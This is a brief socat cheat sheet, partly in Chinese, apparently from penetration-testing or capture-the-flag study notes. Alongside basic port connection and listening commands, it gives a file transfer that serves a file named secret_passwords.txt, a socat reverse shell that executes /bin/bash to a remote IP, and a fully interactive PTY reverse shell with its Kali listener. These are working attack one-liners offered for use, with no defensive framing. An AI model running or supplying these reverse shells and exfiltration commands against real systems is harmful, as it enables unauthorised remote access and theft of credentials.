# socat

```
访问端口        socat - TCP4:<remote server's ip address>:80
监听端口        sudo socat TCP4-LISTEN:443 STDOUT

socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0

文件传输
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
//加了fork的话这个端口哪怕被访问了，也会产生一个子进程保持文件

socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

反弹shell
socat TCP4:10.11.0.22:443 EXEC:/bin/bash


To get the reverse shell from Windows add the 'pipes' command at the end

# socat full interactive shell
root@kali# socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.8:443
```
